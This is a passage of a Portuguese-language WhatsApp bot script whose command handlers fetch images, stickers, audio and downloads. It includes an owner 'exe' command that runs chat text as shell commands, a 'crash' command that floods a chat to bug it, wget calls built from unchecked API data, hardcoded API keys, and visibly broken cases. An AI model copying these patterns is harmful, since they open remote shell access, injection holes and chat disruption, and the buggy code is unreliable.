tels = body.slice(11)
tomioka.updatePresence(from, Presence.composing) 
data = await fetchJson(`https://fdciabdul.tech/api/pinterest/?keyword=sasuke`, {method: 'get'})
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
n = JSON.parse(JSON.stringify(data));
nimsg =  n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimsg)
tomioka.sendMessage(from, pok, image, { quoted: msg, caption: '*saske*'})

break
case 'hinata':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tels = body.slice(11)
tomioka.updatePresence(from, Presence.composing) 
data = await fetchJson(`https://fdciabdul.tech/api/pinterest/?keyword=hinata`, {method: 'get'})
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
n = JSON.parse(JSON.stringify(data));
nimsg =  n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimsg)
tomioka.sendMessage(from, pok, image, { quoted: msg, caption: '*hinata*'})

break
case 'tomioka':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tels = body.slice(11)
tomioka.updatePresence(from, Presence.composing) 
data = await fetchJson(`https://fdciabdul.tech/api/pinterest/?keyword=gyutomioka`, {method: 'get'})
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
n = JSON.parse(JSON.stringify(data));
nimsg =  n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimsg)
tomioka.sendMessage(from, pok, image, { quoted: msg, caption: '*tomioka*'})

break
case 'stalkgithub':
case 'githubstalk':     ////tomioka
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} ivan18274737373`)
enviar('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..') 
username = args[0]
ini_result = await fetchJson(`https://api-gdr2.herokuapp.com/api/github?username=${username}`)
ini_result = ini_result.result
ini_buffer = await getBuffer(ini_result.avatar_url)
ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *USUÁRIO DO GITHUB* 
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Dados obtidos com sucesso!*
\`\`\`▢ id : ${ini_result.id}\`\`\`
\`\`\`▢ node_id : ${ini_result.node_id}\`\`\`
\`\`\`▢ Nome de usuário : ${ini_result.name}\`\`\`
\`\`\`▢ Repo público : ${ini_result.public_repos}\`\`\`
\`\`\`▢ Síntese pública: ${ini_result.public_gists}\`\`\`
\`\`\`▢ Seguidor : ${ini_result.followers}\`\`\`
\`\`\`▢ Seguindo : ${ini_result.following}\`\`\`
\`\`\`▢ Seguir : ${ini_result.bio}\`\`\`
\`\`\`▢ Link : ${ini_result.html_url}\`\`\`
\`\`\`▢ criador : ${ini_result.createStickerd_at}\`\`\`
\`\`\`▢ upado : ${ini_result.updated_at}\`\`\`
`
tomioka.sendMessage(from, ini_buffer, image, { caption: ini_txt, thumbnail: Buffer.alloc(0) })
break
case 'cringe':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
data = fs.readFileSync('./src/tomiokajokes.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex];
hasil = await getBuffer(randKey.result)
sendImage(hasil, msg, '*Boo :V*')
break
case 'alerta':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
data = fs.readFileSync('./src/alerta.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex];
hasil = await getBuffer(randKey.result)
sendImage(hasil, msg, '*alerta :V*')
break
case 'vanitas':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
data = fs.readFileSync('./src/alerta1.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex];
hasil = await getBuffer(randKey.result)
sendImage(hasil, msg, '*vanitas :V*')
break
case 'fogos':                   
if (args.length < 1) return enviar (mess.blank)
teks = body.slice(6)
if (teks.length > 10) return enviar ('O texto é longo, até 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ✓*')
buffer = await getBuffer(`https://api.zeks.xyz/api/tfire?apikey=cAdmS2XqIbRSP3vYAdqHvYqAD6W&text=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'ta ai'})
break			
case 'summer':      
if (args.length < 1) return enviar (mess.blank)
teks = body.slice(7)
if (teks.length > 10) return enviar ('O texto é longo, até 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ✓*')
buffer = await getBuffer(`https://api.zeks.xyz/api/sandw?apikey=cAdmS2XqIbRSP3vYAdqHvYqAD6W&text=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'ta ai'})
break
case 'path':          
if (args.length < 1) return enviar (mess.blank)
teks = body.slice(5)
if (teks.length > 10) return enviar ('O texto é longo, até 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ✓*')
buffer = await getBuffer(`https://api.zeks.xyz/api/crismes?apikey=cAdmS2XqIbRSP3vYAdqHvYqAD6W&text=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'ta ai'})
break
case 'moddroid':
data = await fetchJson(`https://tobz-api.herokuapp.com/api/moddroid?q=${body.slice(10)}&apikey=${TobzApi}`)
hepi = data.result[0] 
teks = `*Nome*: ${data.result[0].title}\n*editor*: ${hepi.publisher}\n*mod info:* ${hepi.mod_info}\n*Tamanho*: ${hepi.size}\n*última versão*: ${hepi.latest_version}\n*gênero*: ${hepi.genre}\n*link:* ${hepi.link}\n*download*: ${hepi.download}`
buffer = await getBuffer(hepi.image)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: `${teks}`})

break
case 'happymod':
data = await fetchJson(`https://tobz-api.herokuapp.com/api/happymod?q=${body.slice(10)}&apikey=${TobzApi}`)
hupo = data.result[0] 
teks = `*Nome*: ${data.result[0].title}\n*versão*: ${hupo.version}\n*Tamanho:* ${hupo.size}\n*root*: ${hupo.root}\n*compra*: ${hupo.price}\n*link*: ${hupo.link}\n*download*: ${hupo.download}`
buffer = await getBuffer(hupo.image)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: `${teks}`})

break
case 'nsfwboquete':

return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
anu = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwblowjob}`, {method: 'get'})
naru = JSON.parse(JSON.stringify(anu));
to =  naru[Math.floor(Math.random() * naru.length)];
nye = await getBuffer(to)
tomioka.sendMessage(from, nye, image, { caption: 'naruto!!', contextInfo: null, quoted: tomio, contextInfo: tome})

break 
case 'resetlink':
if (!isBotGroupAdmins) return enviar(`O BOT PRECISA SER ADM`)
if (!isGroup) return enviar(`SÓ EM GRUPO`)
if (!isGroupAdmins) return enviar(`PRECISA SER ADMININASTROR`)
tomioka.query({ json: ['action', 'inviteReset', from], expect200: true })
linkgc = await tomioka.groupInviteCode(from)
enviar('link resetado com sucesso! Grupo de links novo https://chat.whatsapp.com/'+linkgc)
break
case 'animecry':
cry = getRandom('.gif')
rano = getRandom('.webp')
anu = await fetchJson(`https://tobz-api.herokuapp.com/api/cry?apikey=${TobzApi}`, {method: 'get'})
if (!isGroup) return enviar ('só grupo')
enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
exec(`wget ${anu.result} -O ${cry} && ffmpeg -i ${cry} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(cry)
buffer = fs.readFileSync(rano)
tomioka.sendMessage(from, buffer, sticker, {quoted: msg})
fs.unlinkSync(rano)
})

break 
case 'onich':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tujuh = fs.readFileSync('./assets/sound7.mp3');
tomioka.sendMessage(from, tujuh, MessageType.audio, {quoted: msg, mimetype: 'audio/mp4', ptt:true})
break
case 'ola':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tujuh = fs.readFileSync('./assets/ola.mp3');
tomioka.sendMessage(from, tujuh, MessageType.audio, {quoted: msg, mimetype: 'audio/mp4', ptt:true})
break
case 'bv':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tujuh = fs.readFileSync('./assets/bv.mp3');
tomioka.sendMessage(from, tujuh, MessageType.audio, {quoted: msg, mimetype: 'audio/mp4', ptt:true})
break
case 'tchau':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tujuh = fs.readFileSync('./assets/tchau.mp3');
tomioka.sendMessage(from, tujuh, MessageType.audio, {quoted: msg, mimetype: 'audio/mp4', ptt:true})
break
case 'bem':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tujuh = fs.readFileSync('./assets/bem.mp3');
tomioka.sendMessage(from, tujuh, MessageType.audio, {quoted: msg, mimetype: 'audio/mp4', ptt:true})
break
case 'banoit':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tujuh = fs.readFileSync('./assets/banoit.mp3');
tomioka.sendMessage(from, tujuh, MessageType.audio, {quoted: msg, mimetype: 'audio/mp4', ptt:true})
break
case 'batarde':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tujuh = fs.readFileSync('./assets/batarde.mp3');
tomioka.sendMessage(from, tujuh, MessageType.audio, {quoted: msg, mimetype: 'audio/mp4', ptt:true})
break
case 'bodia':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tujuh = fs.readFileSync('./assets/bodia.mp3');
tomioka.sendMessage(from, tujuh, MessageType.audio, {quoted: msg, mimetype: 'audio/mp4', ptt:true})
break
case 'a':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tujuh = fs.readFileSync('./assets/a.mp3');
tomioka.sendMessage(from, tujuh, MessageType.audio, {quoted: msg, mimetype: 'audio/mp4', ptt:true})
break
case 'beat1':
tujuh = fs.readFileSync('./assets/beat1.mp3');
tomioka.sendMessage(from, tujuh, MessageType.audio, {quoted: msg, mimetype: 'audio/mp4', ptt:true})
break
case 'tomioka':
if (!isGroup) return enviar(` SOMENTE EM GRUPOS`)
result = fs.readFileSync(`./figurinhas/tomioka.webp`)
tomioka.sendMessage(from, result, sticker, {contextInfo: null, quoted: tomio, contextInfo: tome})
break
case 'status':

case 'stats':
groups = tomioka.chats.array.filter(v => v.jid.endsWith('g.us'))
privat = tomioka.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
uptime = process.uptime();
unread = await tomioka.loadAllUnreadMessages();
timestampe = speed();
totallChat = await tomioka.chats.all()
latensie = speed() - timestampe
teks = `\`\`\`ESTATÍSTICAS DE BOT\`\`\`
\`\`\`▢ mensagens nao lidas: ${unread.length}\`\`\`
\`\`\`▢ Bate-papos em grupo : ${groups.length}\`\`\`
\`\`\`▢ Chats Privados : ${privat.length}\`\`\`
\`\`\`▢ Total de bate-papos : ${totallChat.length}\`\`\`
\`\`\`▢ Velocidade : ${latensie.toFixed(4)} _Segundo_\`\`\`
\`\`\`▢ Tempo Ativo : ${kyun(uptime)}\`\`\`


\`\`\`ESTATÍSTICAS DE TELEFONE\`\`\`
\`\`\`▢ Uso de Ram : ${ram2}\`\`\`
\`\`\`▢ Plataforma : ${os.platform()}\`\`\`
\`\`\`▢ Hostname : ${os.hostname()}\`\`\`
\`\`\`▢ Tempo de atividade : ${runtime(process.uptime())}\`\`\`
\`\`\`▢ Wa Versão: ${tomioka.user.phone.wa_version}\`\`\`
\`\`\`▢ A versão: ${tomioka.user.phone.os_version}\`\`\`
\`\`\`▢ Fabricante do dispositivo: ${tomioka.user.phone.device_manufacturer}\`\`\`
\`\`\`▢ Modelo do dispositivo: ${tomioka.user.phone.device_model}\`\`\`
\`\`\`▢ Número da construção do sistema operacional: ${tomioka.user.phone.os_build_number}\`\`\``
enviar(teks)

break
case 'hinata':

return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
anu = await fetchJson(`https://imgur.com/gallery/0nxV5Sc`, {method: 'get'})
hina = JSON.parse(JSON.stringify(anu));
ta =  hina[Math.floor(Math.random() * hina.length)];
nye = await getBuffer(ta)
tomioka.sendMessage(from, nye, image, { caption: 'hinata!!', contextInfo: null, quoted: tomio, contextInfo: tome})

break 
case 'hobby':

hobby = body.slice(1)
const hob =['Desah Di Game','Ngocokin Doi','Stalking sosmed nya mantan','Kau kan gak punya hobby awokawok','Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
const by = hob[Math.floor(Math.random() * hob.length)]
tomioka.sendMessage(from, 'Questão : *'+hobby+'*\n\nResponda : '+ by, text, { contextInfo: null, quoted: tomio, contextInfo: tome})

break
case 'covid19':
post = await fetchJson(`https://api-gdr2.herokuapp.com/api/covidbr`)
send = `𝙇𝙊𝘾𝘼𝙇: ${post.result.local}\n𝘿𝘼𝘿𝙊𝙎 : ${post.result.dadosAtualizados}\n𝙏𝙊𝙏𝘼𝙇 𝘿𝙀 𝘾𝘼𝙎𝙊𝙎: ${post.result.totalCasos}\n𝙉𝙊𝙑𝙊𝙎 𝘾𝘼𝙎𝙊𝙎: ${post.result.novosCasos}\n𝙏𝙊𝙏𝘼𝙇 𝘿𝙀 𝙈𝙊𝙍𝙏𝙀𝙎: ${post.result.totalMortes}\n𝙉𝙊𝙑𝘼𝙎 𝙈𝙊𝙍𝙏𝙀𝙎: ${post.result.novasMortes}\n𝙍𝙀𝘾𝙐𝙋𝙀𝙍𝘼𝘿𝙊𝙎: ${post.result.recuperados}\n𝙑𝘼𝘾𝙄𝙉𝘼𝘿𝙊𝙎-1: ${post.result.vacinadosPrimeiraDose}\n𝙑𝘼𝘾𝙄𝙉𝘼𝘿𝙊𝙎-2: ${post.result.vacinadosSegundaDose}\n𝘽𝙊𝙇𝙀𝙏𝙄𝙉𝙎: ${post.result.boletinsContabilizados}`
tomioka.sendMessage(from, send, text, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "𝐕𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐝𝐨 𝐩𝐨𝐫 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩\nEstatisticas Covid-19 Br", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('./assets/botlogo.webp')} } }, caption: "<//>" })
break
case 'nangis':

ranp = getRandom('.gif')
rano = getRandom('.webp')
anu = await fetchJson(`https://tobz-api.herokuapp.com/api/cry?apikey=${TobzKey}`, {method: 'get'})
enviar('PACIENTE NGAB')
if (anu.error) return enviar (anu.error)
exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar (ind.stikga())
buffer = fs.readFileSync(rano)
tomioka.sendMessage(from, buffer, sticker, {quoted: msg})
fs.unlinkSync(rano)
})

break
case 'exe':
tomioka.updatePresence(from, Presence.composing) 
if (!isOwner) return enviar(mess.only.ownerB)
const cmd = body.slice(5)
exec(cmd, (err, stdout) => {
if(err) return tomioka.sendMessage(from, "Comando errado", text, { quoted: tomio, contextInfo: tome })
if (stdout) {
tomioka.sendMessage(from, stdout, text, { quoted: tomio, contextInfo: tome })
}
})
break
case 'cium':

ranp = getRandom('.gif')
rano = getRandom('.webp')
anu = await fetchJson(`https://tobz-api.herokuapp.com/api/kiss?apikey=${TobzKey}`, {method: 'get'})
enviar('Mwahhh')
if (anu.error) return enviar (anu.error)
exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar (ind.stikga())
buffer = fs.readFileSync(rano)
tomioka.sendMessage(from, buffer, sticker, {quoted: msg})
fs.unlinkSync(rano)
})

break
case 'peluk':

ranp = getRandom('.gif')
rano = getRandom('.webp')
anu = await fetchJson(`https://tobz-api.herokuapp.com/api/hug?apikey=${TobzKey}`, {method: 'get'})
enviar('Peyukkkk')
if (anu.error) return enviar (anu.error)
exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar (ind.stikga())
buffer = fs.readFileSync(rano)
tomioka.sendMessage(from, buffer, sticker, {quoted: msg})
fs.unlinkSync(rano)
})

break
case 'traduzir1':
teks = args.join(" ")
post = await fetchJson(`https://dapuhy-api.herokuapp.com/api/others/translate?from=id&to=pt&text=${teks}&apikey=SOTyzhkStLBrlpT`).then(async (x) => {
send = `${x.result}`
enviar(send)
})
break
case 'igdl':

case 'instagram':

try {

if (!q) return enviar('cade o link?')

enviar('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')

res = await axios.get(`https://api.zeks.xyz/api/ig?apikey=Skillerofc&url=${args[0]}`)

for(let i = 0; i < res.data.result.length; i++) {

sendMediaURL(from, res.data.result[i].url, `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓

┆ *INSTAGRAM MEDIA*

└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶



*Dados obtidos com sucesso!*

\`\`\`▢ Nome do usuário : ${res.data.owner}\`\`\`

\`\`\`▢ Rubrica : ${res.data.caption}\`\`\``, {thumbnail: Buffer.alloc(0)})

}

} catch (e) {

console.log(e)

enviar(String(e))

}

break
case 'crash': //@tio_tomioka_ofc
if (!isOwner) return enviar('dono')
if (args.length < 1) return enviar('qual o tamanho?')
for (let i = 0; i < args[0]; i++) {
await tomioka.toggleDisappearingMessages(from, 0)
}
tomioka.sendMessage(from, 'TOMIOKA BUG👻 '+args.join(' '), fake)
break
case 'pastebin':

if(!q) return enviar(`Example : ɪ ᴀᴍ ᴢᴀᴋʙᴏᴛᴢ`)

anu = await fetchJson(`https://api-anoncybfakeplayer.herokuapp.com/pastebin?text=${q}`, {method: 'get'})

tomioka.sendMessage(from, `${anu.result}`, text, {quoted: tomio, contextInfo: tome})

break
case 'divulgar':
if (!isOwner) return enviar ('Quem é você?')
if (args.length < 1) return enviar ('.......')
anu = await tomioka.chats.all()
if (isMedia && !msg.message.videoMessage || isQuotedImage) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg
buff = await tomioka.downloadMediaMessage(encmedia)
for (let _ of anu) {
tomioka.sendMessage(_.jid, buff, image, {caption: `[ 𝐕𝐢𝐝𝐞𝐨 𝐧𝐨𝐯𝐨 𝐝𝐨 𝐭𝐨𝐦𝐢𝐨𝐤𝐚 ]\n\n${body.slice(4)}`})
}
enviar('Transmissao enviada')
} else {
for (let _ of anu) {
sendMess(_.jid, `[ 𝐕𝐢𝐝𝐞𝐨 𝐧𝐨𝐯𝐨 𝐝𝐨 𝐭𝐨𝐦𝐢𝐨𝐤𝐚 ]\n\n${body.slice(11)}`)
}
enviar('Tm enviada com sucesso')
}
break
case 'bc':
if (!isOwner) return enviar('Quem é Você, você não é meu dono 😂?')
if (args.length < 1) return enviar('.......')
anu = await tomioka.chats.all()
if (isMedia && !msg.message.videoMessage || isQuotedImage) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg
buff = await tomioka.downloadMediaMessage(encmedia)
for (let _ of anu) {
tomioka.sendMessage(_.jid, buff, image, {caption: `[ TRANSMIÇÃO DE AVISO ]\n\n${body.slice(4)}`})
}
enviar('Transmissão enviada com sucesso')
} else {
for (let _ of anu) {
sendMess(_.jid, `[ TRANSMISSÃO DE AVISO ]\n\n${body.slice(4)}`)
}
enviar('Transmissão enviada com sucesso')
}
break
case 'bcsticker':
case 'bcstik':
if (!isOwner) return enviar (mess.only.ownerB)
anu = await tomioka.chats.all()
if (isMedia && !msg.message.videoMessage || isQuotedSticker) {
const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg
bc = await tomioka.downloadMediaMessage(encmedia)
for (let _ of anu) {
tomioka.sendMessage(_.jid, bc, sticker, {quoted:msg})
}
enviar('tm de fig enviada')
}
break
case 'bcaudio':
if (!isOwner) return enviar('```OWNER ONLY```')
if (args.length < 1) return enviar('.......')
anu = await tomioka.chats.all()
if (isMedia && !msg.message.audioMessage || isQuotedAudio) {
const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg
bc = await tomioka.downloadMediaMessage(encmedia)
for (let _ of anu) {
tomioka.sendMessage(_.jid, bc, audio, {mimetype :  'audio/mp4' , duration : 359996400, ptt : true,quoted: tomio, contextInfo: tome,caption: `[ *TOMIOKA TRANSMISSÃO* ]\n\n${body.slice(9)}`})
}
enviar('sucesso')
}
break
////transmissão
case 'banchat':
case 'pausar':
if (!isOwner) return 
if (args.length < 1) return enviar('Para activar usa *si* y para desactivar *no*')
if ((args[0]) === 'si') {
if (isBanChat) return enviar('Ya el bot esta ignorando este chat!')
chatban.push(from)
fs.writeFileSync('./src/ban.json', JSON.stringify(chatban))
enviar('*Bot pausado en este grupo.*')
} else if ((args[0]) === 'no') {
chatban.splice(from)
fs.writeFileSync('./src/ban.json', JSON.stringify(chatban))
enviar('*El Bot ya no esta pausado en este grupo.*')
} else {
enviar(`Porfavor escriba bien el comando: ${prefix}banchat *si/no*`)
}
break
//MODULOS
case 'google':
case 'googleimage':
case 'img':
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar('O que você deseja procurar?')
console.log(color('[premium]', 'cyan'), color('[❗] PROCURANDO A IMAGEM NO GOOGLE...', 'magenta'))
enviar('espere')
teks = args.join(' ')
res = await googleImage(teks, google)
function google(error, result){
if (error){ return enviar('_[ ! ] Erro encontrado ou resultado não encontrado_')}
else {
gugIm = result
random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
sendFileFromUrl(random, image, {quoted: tomio, caption: `*Resultados da pesquisa de : * ${teks}`})
}
}
break
/*
case 'mediafire':
if (args.length < 1) return enviar('Digite o link do arquivo que deseja buscar no Mediafire')
if(!isUrl(args[0]) && !args[0].includes('mediafire'), {DetectLinks: true} ) return 


enviar('*「 ❗ 」 Aguarde um pouco, baixando seu jogo/app...*')
teks = args.join(' ')
const resem = await mediafireDl(teks)
result = `*「  MEDIAFIRE DOWNLOAD  」*

*Nome :* ${resem[0].nama}
*Tamanho :* ${resem[0].size}
*Link :* ${resem[0].link}`
enviar(result)
sendFileFromUrl(resm[0].link, document, {mimetype: resm[0].mime, filename: resm[0].nama, quoted: msg})
break
*/
case 'mediafire':
if (!isPremium) return enviar ('só premium')
if (args.length < 0) return enviar('e o link?')
if (budy.includes("https:"))
//if(!isUrl(args[0]) && isMedia && !args[0].includes('mediafire'), {detectlinks: true}) return //enviar('Link invalido, el link debe ser de MediaFire')
enviar('🕰️ *ᴇsᴘᴇʀᴇ, ᴇᴍ ᴘʀᴏᴄᴇssᴏ..*')
let ment = args.join(' ')
const resm = await zenmediafire(ment)
result = `  *🪀 「  Mediafire Download  」 🪀*

🪀 *Nome:* ${resm[0].nombre}

🪀 *Tamanho:* ${resm[0].size}

🪀 *Link:* ${resm[0].link}

_*O arquivo está sendo enviado, se você não conseguir abrir o arquivo do próprio WhatsApp, basta acessar a pasta WhatsApp e os documentos e lá você verá o arquivo baixado ...*_`
tomioka.sendMessage(from, img, MessageType.image, {quoted: msg, caption: result, contextInfo: null})
sendFileFromUrl(resm[0].link, MessageType.document, {mimetype: resm[0].mime, filename: resm[0].nombre, quoted: msg, contextInfo: null})
break
case 'videourl':
case 'tolink':  
if (!isPremium) return enviar ('só premium')
enviar('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
if ((isMedia && !msg.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg
owgi = await tomioka.downloadMediaMessage(boij)
res = await upload(owgi)
enviar(res)
} else {
enviar('Marque um vídeo')
}
break
case 'igstory': 
if(!q) return enviar('cade o usuario?')
hx.igstory(q)
.then(async result => {
for(let i of result.medias){
if(i.url.includes('mp4')){
let link = await getBuffer(i.url)
tomioka.sendMessage(from,link,video,{quoted: msg,caption: `Type : ${i.type}`})
} else {
let link = await getBuffer(i.url)
tomioka.sendMessage(from,link,image,{quoted: msg,caption: `Type : ${i.type}`, thumbnail:null})               
}
}
});
case 'igstalk':
if (!q) return enviar('cade o usuário?')
ig.fetchUser(`${args.join(' ')}`).then(Y => {
console.log(`${args.join(' ')}`)
ten = `${Y.profile_pic_url_hd}`
teks = `*ID* : ${Y.profile_id}\n*Nome do usuário* : ${args.join('')}\n*Nome completo* : ${Y.full_name}\n*Bio* : ${Y.biography}\n*Seguidores* : ${Y.following}\n*Seguindo* : ${Y.followers}\n*Privado* : ${Y.is_private}\n*Verificado* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
sendMediaURL(from,ten,teks) 
})      
break
case 'playy':

case 'lagu':
        if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar('O que você deseja procurar?')

teks = args.join(' ')

enviar('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')

if (!teks.endsWith("-doc")){

res = await yts(`${teks}`).catch(e => {

enviar('_ [!] O erro de consulta inserido não existe_')

})

enviar(`....mandando sua musica:  *_${res.all[0].title}_*`)
let thumbInfo = `* TOMIOKABOT*
* Título: * ${res.all[0].title}
*ID do vídeo: * ${res.all[0].videoId}
* Carregado em: * ${res.all[0].ago} 
* Visualizações: * ${res.all[0].views}
* Duração: * ${res.all[0].timestamp}
* Canal: * ${res.all[0].author.name}
* Canal do link: * ${res.all[0].author.url}

* _Aguarde o processo de upload ....._ *
`

//sendFileFromUrl(res.all[0].image, image, {quoted: msg, caption: thumbInfo})

res = await y2mateA(res.all[0].url).catch(e => {

enviar('_[!  ] Erro ao entrar no Y2mate_ Web')

})

sendFileFromUrl(res[0].link, audio, {quoted: msg, mimetype: 'audio/mp4', filename: 'tomioka'})

}

if (teks.endsWith("-doc")){

const tec = teks.split("-doc")

res = await yts(`${tec}`).catch(e => {

enviar ('_ [!] Erro de consulta que você inseriu em falta_')
})
enviar(`.Playing ${res.all[0].title}`)
let thumbInfo = `* TOMIOKABOT *
* Título: * ${res.all[0].title} 
*ID do vídeo: * ${res.all[0].videoId}
* Carregado em: * ${res.all[0].ago} 
* Visualizações: * ${res.all[0].views}
* Duração: * ${res.all[0].timestamp}
* Canal: * ${res.all[0].author.name}
* Canal do link: * ${res.all[0].author.url}

* _Aguarde o processo de upload ....._ *
`

sendFileFromUrl(res.all[0].image, image, {quoted: msg, caption: thumbInfo})

res = await y2mateA(res.all[0].url).catch(e => {

enviar('_ [!  ] Erro ao entrar no Y2mate_ Web')

})

sendFileFromUrl(res[0].link, document, {quoted: msg, mimetype: 'audio/mp3', filename: 'tomioka'})

}

break
case 'pl000':   

if (args.length < 1) return enviar('*Digite o título?*')

enviar('carregando....')

play = args.join(" ")

anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp4?q=${play}&apikey=viniciusbot`)

if (anu.error) return enviar(anu.error)

infomp3 = `*「 PLAY VIDEO 」*



Título : ${anu.result.title}

Fonte : ${anu.result.source}



* [Espere] Espere um minuto .. *`

///////buffer = await getBuffer(anu.result.thumbnail)

buffer1 = await getBuffer(anu.result.url_video)

